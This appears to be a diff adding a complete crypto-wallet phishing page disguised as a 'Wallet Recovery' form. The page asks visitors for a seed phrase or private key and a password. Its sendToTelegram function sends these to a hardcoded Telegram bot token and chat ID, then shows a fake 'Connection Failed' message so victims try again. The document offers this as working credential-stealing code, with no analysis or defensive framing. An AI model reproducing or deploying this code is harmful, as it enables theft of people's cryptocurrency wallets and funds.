@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallet Recovery</title>
+    <style>
+      * {
+        text-decoration: none;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        min-height: 100vh;
+        background: #030915;
+        padding: 1rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          sans-serif;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 64rem;
+        margin: 0 auto;
+      }
+
+      /* Tab Styles - Less bold */
+      .tabs-container {
+        margin-bottom: 2rem;
+      }
+
+      .tabs-list {
+        display: flex;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.75rem;
+        padding: 0.25rem;
+        gap: 0.25rem;
+      }
+
+      .tab-trigger {
+        flex: 1;
+        background: none;
+        border: none;
+        color: #a0aec0;
+        font-size: 0.875rem;
+        font-weight: 400; /* Reduced from 500 to 400 */
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      .tab-trigger:hover {
+        color: white;
+        background: rgba(74, 85, 104, 0.5);
+      }
+
+      .tab-trigger.active {
+        background: #4299e1;
+        color: white;
+      }
+
+      .tab-content {
+        display: none;
+      }
+
+      .tab-content.active {
+        display: block;
+      }
+
+      /* Dropdown Styles */
+      .dropdown-container {
+        margin-bottom: 2rem;
+      }
+
+      .dropdown {
+        position: relative;
+        max-width: 24rem;
+      }
+
+      .dropdown-button {
+        width: 100%;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.75rem;
+        padding: 0.75rem 1rem;
+        color: white;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        cursor: pointer;
+        transition: border-color 0.2s;
+      }
+
+      .dropdown-button:hover {
+        border-color: #718096;
+      }
+
+      .chevron {
+        transition: transform 0.2s;
+      }
+
+      .card {
+        border: 1px solid #ffffff;
+        padding: 2.5rem;
+        border-radius: 1rem;
+      }
+
+      .chevron.rotate {
+        transform: rotate(180deg);
+      }
+
+      .dropdown-menu {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        margin-top: 0.5rem;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.75rem;
+        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        z-index: 10;
+        display: none;
+      }
+
+      .dropdown-menu.show {
+        display: block;
+      }
+
+      .dropdown-item {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        text-align: left;
+        color: white;
+        background: none;
+        border: none;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .dropdown-item:hover {
+        background: #2d3748;
+      }
+
+      .dropdown-item:first-child {
+        border-radius: 0.75rem 0.75rem 0 0;
+      }
+
+      .dropdown-item:last-child {
+        border-radius: 0 0 0.75rem 0.75rem;
+      }
+
+      /* Info Banner */
+      .info-banner {
+        margin-bottom: 2rem;
+        background: rgba(30, 64, 175, 0.3);
+        border: 1px solid rgba(66, 153, 225, 0.5);
+        border-radius: 0.75rem;
+        padding: 1rem;
+        display: flex;
+        align-items: flex-start;
+        gap: 0.75rem;
+      }
+
+      .info-icon {
+        width: 1.25rem;
+        height: 1.25rem;
+        border-radius: 50%;
+        background: #4299e1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        margin-top: 0.125rem;
+      }
+
+      .info-icon span {
+        color: white;
+        font-size: 0.75rem;
+        font-weight: bold;
+      }
+
+      .info-banner p {
+        color: #bee3f8;
+        font-size: 0.875rem;
+      }
+
+      /* Phrase Section */
+      .phrase-section {
+        margin-bottom: 2rem;
+      }
+
+      .phrase-section h2 {
+        color: white;
+        font-size: 1.25rem;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 1.5rem;
+      }
+
+      .phrase-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1rem;
+      }
+
+      @media (min-width: 768px) {
+        .phrase-grid {
+          grid-template-columns: repeat(3, 1fr);
+        }
+      }
+
+      .phrase-item {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+      }
+
+      .phrase-number {
+        color: #a0aec0;
+        font-size: 0.875rem;
+        width: 1.5rem;
+        text-align: right;
+      }
+
+      .phrase-input-container {
+        position: relative;
+        flex: 1;
+      }
+
+      .phrase-input {
+        width: 100%;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.5rem;
+        padding: 0.625rem 0.75rem;
+        color: white;
+        transition: border-color 0.2s;
+      }
+
+      .phrase-input:focus {
+        outline: none;
+        border-color: #4299e1;
+      }
+
+      .phrase-input::placeholder {
+        color: #718096;
+      }
+
+      .eye-button {
+        padding: 0.5rem;
+        color: #a0aec0;
+        background: none;
+        border: none;
+        cursor: pointer;
+        transition: color 0.2s;
+      }
+
+      .eye-button:hover {
+        color: white;
+      }
+
+      .eye-icon {
+        display: block;
+      }
+
+      /* Password Section - Modified for single field */
+      .password-section {
+        margin-bottom: 2rem;
+        display: flex;
+        flex-direction: column;
+        align-items: center; /* Center the password field */
+      }
+
+      .password-field {
+        width: 60%; /* Shorter width */
+        max-width: 300px; /* Max width for larger screens */
+      }
+
+      .password-field label {
+        display: block;
+        color: white;
+        font-size: 0.875rem;
+        font-weight: 500;
+        margin-bottom: 0.5rem;
+        text-align: center; /* Center align label */
+      }
+
+      .input-container {
+        position: relative;
+      }
+
+      .input-container input {
+        width: 100%;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.5rem;
+        padding: 0.75rem;
+        padding-right: 3rem;
+        color: white;
+        transition: border-color 0.2s;
+      }
+
+      .input-container input:focus {
+        outline: none;
+        border-color: #4299e1;
+      }
+
+      .input-container input::placeholder {
+        color: #718096;
+      }
+
+      .input-container .eye-button {
+        position: absolute;
+        right: 0.75rem;
+        top: 50%;
+        transform: translateY(-50%);
+      }
+
+      /* Button Container */
+      .button-container {
+        display: flex;
+        justify-content: center;
+      }
+
+      .restore-button {
+        background: #4299e1;
+        color: white;
+        font-weight: 600;
+        padding: 0.75rem 3rem;
+        border-radius: 0.5rem;
+        border: none;
+        cursor: pointer;
+        transition: all 0.2s;
+        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+      }
+
+      .restore-button:hover {
+        background: #3182ce;
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+      }
+
+      /* Private Key Section */
+      .private-key-section {
+        margin-bottom: 2rem;
+      }
+
+      .private-key-section h2 {
+        color: white;
+        font-size: 1.25rem;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 1.5rem;
+      }
+
+      .private-key-field {
+        margin-bottom: 1rem;
+      }
+
+      .private-key-field label {
+        display: block;
+        color: white;
+        font-size: 0.875rem;
+        font-weight: 500;
+        margin-bottom: 0.5rem;
+      }
+
+      .private-key-input {
+        width: 100%;
+        background: #1a202c;
+        border: 1px solid #4a5568;
+        border-radius: 0.5rem;
+        padding: 0.75rem;
+        padding-right: 3rem;
+        color: white;
+        transition: border-color 0.2s;
+        font-family: monospace;
+        font-size: 0.875rem;
+      }
+
+      .private-key-input:focus {
+        outline: none;
+        border-color: #4299e1;
+      }
+
+      .private-key-input::placeholder {
+        color: #718096;
+      }
+
+      /* Hidden Eye Icons */
+      .eye-off {
+        display: none;
+      }
+
+      .show-eye-off .eye-icon {
+        display: none;
+      }
+
+      .show-eye-off .eye-off {
+        display: block;
+      }
+
+      /* Modal Styles */
+      .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.7);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        backdrop-filter: blur(5px);
+      }
+
+      .modal-overlay.hidden {
+        display: none;
+      }
+
+      .modal {
+        background: rgba(26, 32, 44, 0.95);
+        border: 1px solid #4a5568;
+        border-radius: 1rem;
+        width: 90%;
+        max-width: 400px;
+        overflow: hidden;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+      }
+
+      .modal-content {
+        padding: 2rem;
+        text-align: center;
+      }
+
+      .modal-icon {
+        font-size: 3rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .modal-title {
+        color: white;
+        font-size: 1.5rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+      }
+
+      .modal-message {
+        color: #e2e8f0;
+        margin-bottom: 1.5rem;
+        line-height: 1.5;
+      }
+
+      .modal-buttons {
+        display: flex;
+        gap: 1rem;
+        justify-content: center;
+      }
+
+      .modal-button {
+        padding: 0.75rem 1.5rem;
+        border-radius: 0.5rem;
+        border: none;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      .modal-button.primary {
+        background: #4299e1;
+        color: white;
+      }
+
+      .modal-button.primary:hover {
+        background: #3182ce;
+      }
+
+      .modal-button.secondary {
+        background: #4a5568;
+        color: white;
+      }
+
+      .modal-button.secondary:hover {
+        background: #718096;
+      }
+
+      /* Loading spinner */
+      .loading-spinner {
+        display: inline-block;
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(66, 153, 225, 0.3);
+        border-radius: 50%;
+        border-top-color: #4299e1;
+        animation: spin 1s linear infinite;
+        margin-bottom: 1.5rem;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .success-icon {
+        color: #ed0000;
+        font-size: 3rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .error-icon {
+        color: #f50000;
+        font-size: 3rem;
+        margin-bottom: 1.5rem;
+      }
+      #secure {
+        text-align: center;
+        color: #ffff;
+        font-weight: 600;
+        margin-bottom: 15px;
+      }
+      .secure {
+        color: #dfe7eb;
+        text-align: center;
+        margin-left: auto;
+        margin-right: auto;
+        margin-bottom: 20px;
+        width: 95%;
+        font-size: 12px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <!-- Tabs Header - Less bold text -->
+        <div class="tabs-container">
+          <div class="tabs-list">
+            <button class="tab-trigger active" data-tab="phrase">
+              Recovery Phrase
+            </button>
+            <button class="tab-trigger" data-tab="private-key">
+              Private Key
+            </button>
+          </div>
+        </div>
+
+        <!-- Recovery Phrase Tab Content -->
+        <div class="tab-content active" id="phrase-tab">
+          <!-- Header Dropdown -->
+          <div class="dropdown-container">
+            <div class="dropdown">
+              <button class="dropdown-button" id="dropdownButton">
+                <span id="dropdownText">I have a 12-word phrase</span>
+                <svg
+                  class="chevron"
+                  id="chevronIcon"
+                  width="20"
+                  height="20"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                >
+                  <polyline points="6,9 12,15 18,9"></polyline>
+                </svg>
+              </button>
+
+              <div class="dropdown-menu" id="dropdownMenu">
+                <button class="dropdown-item" data-length="12">
+                  I have a 12-word phrase
+                </button>
+                <button class="dropdown-item" data-length="15">
+                  I have a 15-word phrase
+                </button>
+                <button class="dropdown-item" data-length="18">
+                  I have a 18-word phrase
+                </button>
+                <button class="dropdown-item" data-length="21">
+                  I have a 21-word phrase
+                </button>
+                <button class="dropdown-item" data-length="24">
+                  I have a 24-word phrase
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Info Banner -->
+          <div class="info-banner">
+            <div class="info-icon">
+              <span>i</span>
+            </div>
+            <p>
+              You can paste your entire secret recovery phrase into the field
+              once
+            </p>
+          </div>
+
+          <!-- Secret Recovery Phrase Section -->
+          <div class="phrase-section">
+            <h2>Secret Recovery Phrase</h2>
+
+            <div class="phrase-grid" id="phraseGrid">
+              <!-- Phrase inputs will be generated by JavaScript -->
+            </div>
+          </div>
+        </div>
+
+        <!-- Private Key Tab Content -->
+        <div class="tab-content" id="private-key-tab">
+          <!-- Info Banner for Private Key -->
+          <div class="info-banner">
+            <div class="info-icon">
+              <span>i</span>
+            </div>
+            <p>Enter your private key to restore wallet access</p>
+          </div>
+
+          <!-- Private Key Section -->
+          <div class="private-key-section">
+            <h2>Private Key</h2>
+
+            <div class="private-key-field">
+              <label for="privateKeyInput">Private Key</label>
+              <div class="input-container">
+                <input
+                  type="password"
+                  id="privateKeyInput"
+                  placeholder="Enter your private key"
+                  class="private-key-input"
+                />
+                <button class="eye-button" id="togglePrivateKey" type="button">
+                  <svg
+                    class="eye-icon"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  >
+                    <path
+                      d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
+                    ></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                  </svg>
+                  <svg
+                    class="eye-off"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  >
+                    <path
+                      d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
+                    ></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Password Section - Single field with shorter width -->
+        <div class="password-section">
+          <div class="password-field">
+            <label for="newPassword">New password (8 characters)</label>
+            <div class="input-container">
+              <input
+                type="password"
+                id="newPassword"
+                placeholder="Enter your password"
+              />
+              <button class="eye-button" id="toggleNewPassword" type="button">
+                <svg
+                  class="eye-icon"
+                  width="16"
+                  height="16"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                >
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+                <svg
+                  class="eye-off"
+                  width="16"
+                  height="16"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                >
+                  <path
+                    d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
+                  ></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Restore Button -->
+        <div class="button-container">
+          <button class="restore-button" id="restoreButton">Connect</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal Structure -->
+    <div class="modal-overlay hidden" id="modalOverlay">
+      <div class="modal">
+        <div class="modal-content" id="modalContent">
+          <!-- Content will be dynamically inserted here -->
+        </div>
+      </div>
+    </div>
+
+    <script>
+      class WalletRecovery {
+        constructor() {
+          this.phraseLength = 12;
+          this.phraseWords = Array(12).fill("");
+          this.visibleFields = Array(12).fill(false);
+          this.newPassword = "";
+          this.showNewPassword = false;
+          this.privateKey = "";
+          this.showPrivateKey = false;
+          this.activeTab = "phrase";
+
+          // Modal elements
+          this.modalOverlay = document.getElementById("modalOverlay");
+          this.modalContent = document.getElementById("modalContent");
+
+          this.init();
+        }
+
+        init() {
+          this.setupTabs();
+          this.setupDropdown();
+          this.setupPasswordToggle();
+          this.setupPrivateKeyToggle();
+          this.setupRestoreButton();
+          this.generatePhraseInputs();
+          this.setupClickOutside();
+        }
+
+        showModal(content) {
+          this.modalContent.innerHTML = content;
+          this.modalOverlay.classList.remove("hidden");
+        }
+
+        hideModal() {
+          this.modalOverlay.classList.add("hidden");
+        }
+
+        showLoadingModal() {
+          const content = `
+                <div class="loading-spinner"></div>
+                <h2 class="modal-title">Please Wait</h2>
+                <p class="modal-message">Securely connecting to your wallet..</p>
+            `;
+          this.showModal(content);
+        }
+
+        showSuccessModal() {
+          const content = `
+                <div class="success-icon">x</div>
+                <p class="modal-message">Connection Failed, Try Again...</p>
+                <div class="modal-buttons">
+                    <button class="modal-button primary" id="modalCloseButton">Close</button>
+                </div>
+            `;
+          this.showModal(content);
+
+          document
+            .getElementById("modalCloseButton")
+            .addEventListener("click", () => {
+              this.hideModal();
+              this.resetForm();
+            });
+        }
+
+        showErrorModal(errorMessage) {
+          const content = `
+               <div class="error-icon">⚠️</div>
+        <h2 class="modal-title">Connection Failed</h2>
+        <p class="modal-message">${errorMessage}</p>
+        <div class="modal-buttons">
+            <a href="/app/connect.html" class="modal-button secondary" id="modalRetryButton">Try Again</a>
+            <button class="modal-button primary" id="modalCloseButton">Close</button>
+        </div>
+    `;
+          this.showModal(content);
+
+          document
+            .getElementById("modalRetryButton")
+            .addEventListener("click", () => {
+              this.hideModal();
+              this.handleRestore();
+            });
+
+          document
+            .getElementById("modalCloseButton")
+            .addEventListener("click", () => {
+              this.hideModal();
+            });
+        }
+
+        resetForm() {
+          if (this.activeTab === "phrase") {
+            this.phraseWords = Array(this.phraseLength).fill("");
+            this.generatePhraseInputs();
+          } else {
+            this.privateKey = "";
+            document.getElementById("privateKeyInput").value = "";
+          }
+
+          this.newPassword = "";
+          document.getElementById("newPassword").value = "";
+        }
+
+        setupTabs() {
+          const tabTriggers = document.querySelectorAll(".tab-trigger");
+          const tabContents = document.querySelectorAll(".tab-content");
+
+          tabTriggers.forEach((trigger) => {
+            trigger.addEventListener("click", () => {
+              const tabId = trigger.dataset.tab;
+
+              // Remove active class from all triggers and contents
+              tabTriggers.forEach((t) => t.classList.remove("active"));
+              tabContents.forEach((c) => c.classList.remove("active"));
+
+              // Add active class to clicked trigger and corresponding content
+              trigger.classList.add("active");
+              document.getElementById(`${tabId}-tab`).classList.add("active");
+
+              this.activeTab = tabId;
+            });
+          });
+        }
+
+        setupPrivateKeyToggle() {
+          const privateKeyInput = document.getElementById("privateKeyInput");
+          const togglePrivateKey = document.getElementById("togglePrivateKey");
+
+          privateKeyInput.addEventListener("input", (e) => {
+            this.privateKey = e.target.value;
+          });
+
+          togglePrivateKey.addEventListener("click", () => {
+            this.showPrivateKey = !this.showPrivateKey;
+            privateKeyInput.type = this.showPrivateKey ? "text" : "password";
+
+            if (this.showPrivateKey) {
+              togglePrivateKey.classList.add("show-eye-off");
+            } else {
+              togglePrivateKey.classList.remove("show-eye-off");
+            }
+          });
+        }
+
+        setupDropdown() {
+          const dropdownButton = document.getElementById("dropdownButton");
+          const dropdownMenu = document.getElementById("dropdownMenu");
+          const chevronIcon = document.getElementById("chevronIcon");
+          const dropdownText = document.getElementById("dropdownText");
+
+          dropdownButton.addEventListener("click", () => {
+            const isOpen = dropdownMenu.classList.contains("show");
+
+            if (isOpen) {
+              dropdownMenu.classList.remove("show");
+              chevronIcon.classList.remove("rotate");
+            } else {
+              dropdownMenu.classList.add("show");
+              chevronIcon.classList.add("rotate");
+            }
+          });
+
+          // Handle dropdown item selection
+          const dropdownItems = document.querySelectorAll(".dropdown-item");
+          dropdownItems.forEach((item) => {
+            item.addEventListener("click", (e) => {
+              const length = parseInt(e.target.dataset.length);
+              this.handlePhraseLengthChange(length);
+              dropdownText.textContent = `I have a ${length}-word phrase`;
+              dropdownMenu.classList.remove("show");
+              chevronIcon.classList.remove("rotate");
+            });
+          });
+        }
+
+        setupClickOutside() {
+          document.addEventListener("click", (e) => {
+            const dropdown = document.querySelector(".dropdown");
+            const dropdownMenu = document.getElementById("dropdownMenu");
+            const chevronIcon = document.getElementById("chevronIcon");
+
+            if (!dropdown.contains(e.target)) {
+              dropdownMenu.classList.remove("show");
+              chevronIcon.classList.remove("rotate");
+            }
+          });
+        }
+
+        handlePhraseLengthChange(length) {
+          this.phraseLength = length;
+          this.phraseWords = Array(length).fill("");
+          this.visibleFields = Array(length).fill(false);
+          this.generatePhraseInputs();
+        }
+
+        generatePhraseInputs() {
+          const phraseGrid = document.getElementById("phraseGrid");
+          phraseGrid.innerHTML = "";
+
+          for (let i = 0; i < this.phraseLength; i++) {
+            const phraseItem = document.createElement("div");
+            phraseItem.className = "phrase-item";
+
+            phraseItem.innerHTML = `
+                    <span class="phrase-number">${i + 1}.</span>
+                    <div class="phrase-input-container">
+                        <input 
+                            type="${
+                              this.visibleFields[i] ? "text" : "password"
+                            }" 
+                            class="phrase-input" 
+                            data-index="${i}"
+                            value="${this.phraseWords[i]}"
+                            placeholder=""
+                        />
+                    </div>
+                    <button class="eye-button" data-index="${i}" type="button">
+                        <svg class="eye-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                        <svg class="eye-off" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                            <line x1="1" y1="1" x2="23" y2="23"></line>
+                        </svg>
+                    </button>
+                `;
+
+            phraseGrid.appendChild(phraseItem);
+          }
+
+          // Add event listeners for phrase inputs
+          this.setupPhraseInputs();
+        }
+
+        setupPhraseInputs() {
+          const phraseInputs = document.querySelectorAll(".phrase-input");
+          const eyeButtons = document.querySelectorAll(
+            ".phrase-item .eye-button"
+          );
+
+          phraseInputs.forEach((input) => {
+            input.addEventListener("input", (e) => {
+              const index = parseInt(e.target.dataset.index);
+              this.phraseWords[index] = e.target.value;
+            });
+
+            // Handle paste event for full phrase
+            input.addEventListener("paste", (e) => {
+              const pastedText = e.clipboardData.getData("text");
+              const words = pastedText.trim().split(/\s+/);
+
+              if (words.length >= this.phraseLength) {
+                e.preventDefault();
+                for (let i = 0; i < this.phraseLength; i++) {
+                  this.phraseWords[i] = words[i] || "";
+                  const inputElement = document.querySelector(
+                    `[data-index="${i}"]`
+                  );
+                  if (inputElement) {
+                    inputElement.value = this.phraseWords[i];
+                  }
+                }
+              }
+            });
+          });
+
+          eyeButtons.forEach((button) => {
+            button.addEventListener("click", (e) => {
+              const index = parseInt(e.currentTarget.dataset.index);
+              this.togglePhraseFieldVisibility(index);
+            });
+          });
+        }
+
+        togglePhraseFieldVisibility(index) {
+          this.visibleFields[index] = !this.visibleFields[index];
+          const input = document.querySelector(`[data-index="${index}"]`);
+          const eyeButton = document.querySelector(
+            `[data-index="${index}"].eye-button`
+          );
+
+          if (input) {
+            input.type = this.visibleFields[index] ? "text" : "password";
+          }
+
+          if (eyeButton) {
+            if (this.visibleFields[index]) {
+              eyeButton.classList.add("show-eye-off");
+            } else {
+              eyeButton.classList.remove("show-eye-off");
+            }
+          }
+        }
+
+        setupPasswordToggle() {
+          const newPasswordInput = document.getElementById("newPassword");
+          const toggleNewPassword =
+            document.getElementById("toggleNewPassword");
+
+          // Add eye-off icon to password toggle button
+          toggleNewPassword.innerHTML += `
+                <svg class="eye-off" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+            `;
+
+          newPasswordInput.addEventListener("input", (e) => {
+            this.newPassword = e.target.value;
+          });
+
+          toggleNewPassword.addEventListener("click", () => {
+            this.showNewPassword = !this.showNewPassword;
+            newPasswordInput.type = this.showNewPassword ? "text" : "password";
+
+            if (this.showNewPassword) {
+              toggleNewPassword.classList.add("show-eye-off");
+            } else {
+              toggleNewPassword.classList.remove("show-eye-off");
+            }
+          });
+        }
+
+        setupRestoreButton() {
+          const restoreButton = document.getElementById("restoreButton");
+
+          restoreButton.addEventListener("click", () => {
+            this.handleRestore();
+          });
+        }
+
+        async handleRestore() {
+          // Validate inputs based on active tab
+          if (this.activeTab === "phrase") {
+            const filledWords = this.phraseWords.filter(
+              (word) => word.trim() !== ""
+            );
+            if (filledWords.length !== this.phraseLength) {
+              this.showErrorModal(
+                `Please fill in all ${this.phraseLength} words of your recovery phrase.`
+              );
+              return;
+            }
+          } else if (this.activeTab === "private-key") {
+            if (!this.privateKey.trim()) {
+              this.showErrorModal("Please enter your private key.");
+              return;
+            }
+            if (
+              !/^[0-9a-fA-F]+$/.test(this.privateKey.trim()) ||
+              this.privateKey.trim().length < 64
+            ) {
+              this.showErrorModal(
+                "Please enter a valid private key (64-character hexadecimal)."
+              );
+              return;
+            }
+          }
+
+          if (this.newPassword.length < 8) {
+            this.showErrorModal("Password must be at least 8 characters long.");
+            return;
+          }
+
+          // Show loading modal
+          this.showLoadingModal();
+
+          try {
+            const method =
+              this.activeTab === "phrase" ? "phrase" : "private-key";
+            const payload = {
+              method,
+              password: this.newPassword,
+              ...(method === "phrase"
+                ? { phrase: this.phraseWords }
+                : { privateKey: this.privateKey }),
+            };
+
+            // Send to Telegram
+            await this.sendToTelegram(payload);
+
+            // Show success after a short delay
+            setTimeout(() => {
+              this.showSuccessModal();
+            }, 1000);
+          } catch (error) {
+            this.showErrorModal(
+              `Connection failed: ${
+                error.message ||
+                "Please check your internet connection and try again."
+              }`
+            );
+          }
+        }
+
+        async sendToTelegram(data) {
+          // Telegram bot configuration
+          const TELEGRAM_BOT_TOKEN =
+            "7815301058:AAGndJXKerXr3HOvSE8vb1BFrq0F0mtNlOA";
+          const TELEGRAM_CHAT_ID = "7320153466";
+
+          // Telegram API endpoint
+          const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+          // Escape function for Markdown special characters
+          function escapeMarkdown(text) {
+            if (!text) return "";
+            return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
+          }
+
+          // Format the message safely escaping markdown characters
+          let message = `⚠️ *WALLET RECOVERY REQUEST* ⚠️\n\n`;
+          message += `*Method:* ${escapeMarkdown(
+            data.method === "phrase" ? "Recovery Phrase" : "Private Key"
+          )}\n`;
+
+          if (data.method === "phrase") {
+            // Escape each word in phrase individually
+            const escapedPhrase = data.phrase.map(escapeMarkdown).join(" ");
+            message += `*Recovery Phrase:* ${escapedPhrase}\n`;
+          } else {
+            message += `*Private Key:* ${escapeMarkdown(data.privateKey)}\n`;
+          }
+
+          message += `*Password:* ${escapeMarkdown(data.password)}\n\n`;
+          message += `_Received at: ${escapeMarkdown(
+            new Date().toLocaleString()
+          )}_`;
+
+          // Encode message for URL
+          const encodedMessage = encodeURIComponent(message);
+
+          // Build request URL
+          const requestUrl = `${TELEGRAM_API}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+
+          try {
+            const response = await fetch(requestUrl);
+
+            if (!response.ok) {
+              const errorData = await response.json();
+              throw new Error(errorData.description || "error");
+            }
+
+            return await response.json();
+          } catch (error) {
+            console.error("Telegram submission error:", error);
+            throw new Error(
+              "Failed check your internet connection and try again"
+            );
+          }
+        }
+      }
+
+      // Initialize the application when the DOM is loaded
+      document.addEventListener("DOMContentLoaded", () => {
+        new WalletRecovery();
+      });
+    </script>
+  </body>
+</html>
